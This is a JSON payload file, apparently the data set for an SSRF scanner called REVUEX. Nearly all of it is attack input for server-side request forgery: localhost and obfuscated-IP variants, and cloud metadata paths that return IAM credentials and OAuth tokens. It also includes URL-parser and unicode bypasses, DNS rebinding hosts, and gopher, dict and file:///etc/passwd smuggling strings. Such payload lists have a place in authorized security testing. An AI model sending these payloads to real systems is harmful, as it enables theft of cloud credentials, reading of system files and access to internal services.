{
  "metadata": {
    "name": "SSRF Payloads v4.0",
    "version": "4.0.0",
    "description": "SSRF testing payloads for REVUEX SSRF Scanner GOLD v4.0",
    "author": "REVUEX Team"
  },
  "ssrf_parameters": {
    "description": "Common SSRF-vulnerable parameter names",
    "high_priority": [
      "url", "link", "uri", "src", "source", "target", "dest", "destination",
      "redirect", "redirect_url", "redirect_uri", "return", "return_url",
      "callback", "callback_url", "next", "next_url"
    ],
    "medium_priority": [
      "path", "file", "document", "page", "load", "fetch", "proxy",
      "request", "site", "resource", "ref", "reference"
    ],
    "low_priority": [
      "img", "image", "avatar", "icon", "feed", "rss", "xml",
      "api", "endpoint", "host", "domain", "server"
    ]
  },
  "internal_payloads": {
    "localhost": [
      "http://127.0.0.1",
      "http://localhost",
      "http://127.0.0.1:80",
      "http://127.0.0.1:443",
      "http://127.0.0.1:8080",
      "http://127.0.0.1:8443",
      "http://127.0.0.1:3000",
      "http://127.0.0.1:5000"
    ],
    "ipv6": [
      "http://[::1]",
      "http://[0:0:0:0:0:0:0:1]",
      "http://[::ffff:127.0.0.1]"
    ],
    "alternative": [
      "http://0.0.0.0",
      "http://0",
      "http://127.1",
      "http://127.0.1",
      "http://2130706433",
      "http://017700000001",
      "http://0x7f.0.0.1",
      "http://0x7f000001"
    ]
  },
  "cloud_metadata": {
    "aws": {
      "base": "http://169.254.169.254/latest/",
      "endpoints": [
        "meta-data/",
        "meta-data/ami-id",
        "meta-data/hostname",
        "meta-data/iam/security-credentials/",
        "user-data",
        "dynamic/instance-identity/document"
      ]
    },
    "gcp": {
      "base": "http://metadata.google.internal/computeMetadata/v1/",
      "headers": {"Metadata-Flavor": "Google"},
      "endpoints": [
        "project/project-id",
        "instance/hostname",
        "instance/service-accounts/default/token"
      ]
    },
    "azure": {
      "base": "http://169.254.169.254/metadata/",
      "headers": {"Metadata": "true"},
      "endpoints": [
        "instance?api-version=2021-02-01",
        "identity/oauth2/token"
      ]
    },
    "digital_ocean": {
      "base": "http://169.254.169.254/metadata/v1/",
      "endpoints": [
        "hostname",
        "user-data",
        "region"
      ]
    }
  },
  "bypass_techniques": {
    "url_parser_confusion": [
      "http://127.0.0.1#@example.com",
      "http://example.com@127.0.0.1",
      "http://127.0.0.1%23@example.com",
      "http://127.0.0.1%2523@example.com",
      "http://127.0.0.1:80%23@example.com"
    ],
    "unicode_encoding": [
      "http://127。0。0。1",
      "http://①②⑦.0.0.1",
      "http://127．0．0．1"
    ],
    "dns_rebinding": [
      "http://localtest.me",
      "http://spoofed.burpcollaborator.net",
      "http://127.0.0.1.nip.io"
    ],
    "protocol_smuggling": [
      "gopher://127.0.0.1:25/",
      "dict://127.0.0.1:11211/",
      "file:///etc/passwd"
    ]
  },
  "header_injection": {
    "description": "Headers for blind SSRF testing",
    "headers": [
      "X-Forwarded-For",
      "X-Forwarded-Host",
      "X-Original-URL",
      "X-Rewrite-URL",
      "Referer",
      "Host",
      "X-Custom-IP-Authorization",
      "X-Real-IP"
    ]
  },
  "response_indicators": {
    "positive": [
      "localhost",
      "127.0.0.1",
      "::1",
      "internal",
      "private",
      "metadata",
      "instance",
      "ami-id",
      "hostname"
    ],
    "error_based": [
      "connection refused",
      "no route to host",
      "network unreachable",
      "timeout",
      "could not resolve"
    ]
  },
  "common_endpoints": {
    "description": "Common SSRF-prone API paths",
    "paths": [
      "/api/proxy",
      "/api/fetch",
      "/api/url",
      "/api/request",
      "/proxy",
      "/fetch",
      "/redirect",
      "/callback",
      "/load",
      "/image",
      "/avatar",
      "/webhook",
      "/api/webhook"
    ]
  },
  "sie_patterns": {
    "description": "Patterns for Scope Intelligence Engine",
    "javascript": {
      "fetch": "fetch\\s*\\(\\s*['\"`]([^'\"`]+)['\"`]",
      "axios": "axios\\.(get|post|put|delete|patch)\\s*\\(\\s*['\"`]([^'\"`]+)['\"`]",
      "xhr": "\\.open\\s*\\(\\s*['\"`](\\w+)['\"`]\\s*,\\s*['\"`]([^'\"`]+)['\"`]"
    },
    "html": {
      "form_action": "<form[^>]*action=['\"]([^'\"]+)['\"]",
      "href": "href\\s*=\\s*['\"]([^'\"]+)['\"]"
    }
  }
}
